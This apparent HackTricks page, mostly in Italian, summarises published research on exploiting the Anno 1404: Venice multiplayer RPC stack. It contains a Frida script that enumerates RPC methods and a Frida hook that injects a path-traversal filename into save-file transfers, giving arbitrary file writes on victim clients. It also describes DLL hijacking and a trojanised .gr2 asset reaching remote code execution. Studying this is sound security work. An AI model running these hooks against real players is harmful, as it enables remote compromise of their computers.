# Enumerazione RPC UDP personalizzata e abuso del trasferimento di file

{{#include ../../banners/hacktricks-training.md}}

## Mappatura di oggetti RPC proprietari con Frida

I titoli multiplayer più vecchi spesso integrano stack RPC fatti in casa sopra UDP. In *Anno 1404: Venice* questo è implementato all'interno di `NetComEngine3.dll` tramite il dispatcher `RMC_CallMessage`, che estrae 5 campi da ogni datagramma:

| Campo | Scopo |
| --- | --- |
| `ID` | verbo RPC (16-bit) |
| `Flags` | modificatori di trasporto (affidabilità, ordinamento) |
| `Source` | Object ID del chiamante |
| `TargetObject` | istanza dell'oggetto remoto |
| `Method` | indice del metodo all'interno della classe target |

Due funzioni di supporto – `ClassToMethodName()` e `TargetName()` – traducono gli ID grezzi in stringhe leggibili per il logging. Brute-forcing gli object ID a 24‑bit e i method ID a 16‑bit e chiamando queste helper ci permette di enumerare l'intera superficie raggiungibile da remoto senza catture del traffico o symbol leaks.

<details>
<summary>Enumeratore della superficie Frida (ridotto)</summary>
```javascript
'use strict';

const classToMethod = Module.getExportByName('NetComEngine3.dll', 'ClassToMethodName');
const targetName = Module.getExportByName('NetComEngine3.dll', 'TargetName');

function tryID(objID, methodID) {
const method = new NativeFunction(classToMethod, 'pointer', ['pointer', 'uint']);
const target = new NativeFunction(targetName, 'pointer', ['pointer']);
const buf = Memory.alloc(Process.pointerSize);
buf.writeU32(objID);
const m = method(buf, methodID);
if (!m.isNull()) {
const t = target(buf);
console.log(objID.toString(16), '=', t.readUtf16String());
console.log('  -', methodID, '=', m.readUtf16String());
}
}

for (let obj = 0; obj < 0x9000000; obj += 0x400000) {
for (let meth = 0; meth < 0x40; meth++) {
tryID(obj, meth);
}
}
```
</details>

L'esecuzione di `frida -l explore-surface.js Addon.exe` ha emesso la mappa RPC completa, incluso l'oggetto `Player` (`0x7400000`) e i suoi verbi di file-transfer `OnSendFileInit`, `OnSendFileData`, `OnReceivedFileData` e `OnCancelSendFile`. Lo stesso flusso di lavoro si applica a qualsiasi protocollo binario che espone helper di reflection interni: intercettare il dispatcher, brute-force IDs e loggare ciò che il motore già conosce su ogni metodo invocabile.

### Suggerimenti

- Usa i buffer di logging del motore (`WString::Format` in questo caso) per evitare di reimplementare encoding di stringhe non documentati.
- Esegui il dump di `Flags` per identificare funzionalità di affidabilità (ACK, resend requests) prima di tentare il fuzzing; custom UDP stacks spesso scartano silenziosamente pacchetti malformati.
- Conserva la mappa enumerata – serve come corpus per il fuzzing e rende ovvio quali oggetti manipolano il filesystem, lo stato del mondo o lo scripting in-game.

## Sfruttare gli RPC di trasferimento file

La sincronizzazione dei salvataggi multiplayer utilizzava un handshake a due pacchetti:

1. `OnSendFileInit` — contiene il nome file UTF‑16 che il client dovrebbe usare per salvare il payload in arrivo.
2. `OnSendFileData` — streama il contenuto grezzo del file in chunk di dimensione fissa.

Poiché il server serializza il filename tramite `ByteStreamWriteString()` immediatamente prima dell'invio, a Frida hook può scambiare il puntatore con un traversal payload mantenendo intatte le dimensioni dei pacchetti.

<details>
<summary>Sostituzione del filename</summary>
```javascript
const writeStr = ptr('0x1003A250');
const ByteStreamWriteString = new NativeFunction(writeStr, 'pointer', ['pointer', 'pointer']);
const evil = Memory.allocUtf16String('..\\..\\..\\..\\Sauvegarde.sww');

Interceptor.attach(writeStr, {
onEnter(args) {
const src = args[1].readPointer();
const value = src.readUtf16String();
if (value && value.indexOf('Sauvegarde.sww') !== -1) {
args[1].writePointer(evil);
}
}
});
```
</details>

I client vittima non effettuavano alcuna sanitizzazione e scrivevano il salvataggio ricevuto nel percorso fornito dall'host ostile, per esempio inserendolo in `C:\User\user` invece che nell'albero previsto `...\Savegames\MPShare`. Sulle installazioni Windows di Anno 1404 la directory del gioco è scrivibile da tutti, quindi il path traversal diventa immediatamente un primitivo di scrittura file arbitraria:

- **Drop DLLs** for classic search-order hijacking on next launch, or
- **Overwrite asset archives** (RDA files) so that weaponized models, textures, or scripts are loaded live during the same session.

### Defending / attacking other targets

- Look for RPC verbs named `SendFile`, `Upload`, `ShareSave`, etc., then intercept the serialization helper responsible for filenames or target directories.
- Anche se i nomi file vengono controllati in lunghezza, molte stack dimenticano di canonicalizzare `..\` o sequenze miste `/` vs `\`; prova tutti i separatori con brute-force.
- Quando il ricevente memorizza file sotto il percorso di installazione del gioco, controlla gli ACL tramite `icacls` per confermare se un utente non privilegiato può inserire codice lì.

## Turning path traversal into live asset execution

Once you can upload arbitrary bytes, replace any frequently loaded asset:

1. **Unpack the archive.** Gli archivi RDA sono contenitori basati su DEFLATE i cui metadati sono opzionalmente XOR-offuscati con stream seedati da `srand(0xA2C2A)`. Strumenti come [RDAExplorer](https://github.com/lysanntranvouez/RDAExplorer) ri-impacchettano gli archivi dopo le modifiche.
2. **Inject a malicious `.gr2`.** Il file Granny 3D trojanizzato contiene l'exploit di relocation che sovrascrive `SectionContentArray` e, tramite una sequenza di relocation in due fasi, ottiene una write arbitraria di 4 byte all'interno di `granny2.dll`.
3. **Hijack allocator callbacks.** Con ASLR disabilitato e DEP off, sostituire i puntatori di funzione `malloc/free` in `granny2.dll` reindirizza la successiva allocazione al tuo shellcode, fornendo RCE immediato senza aspettare che la vittima riavvii il gioco.

This pattern generalises to any title that streams structured assets from binary archives: combine RPC-level traversal for delivery and unsafe relocation processing for code execution.

## References

- [Synacktiv – Exploiting Anno 1404](https://www.synacktiv.com/publications/exploiting-anno-1404.html)
- [RDA File Format notes](https://github.com/lysanntranvouez/RDAExplorer/wiki/RDA-File-Format)

{{#include ../../banners/hacktricks-training.md}}
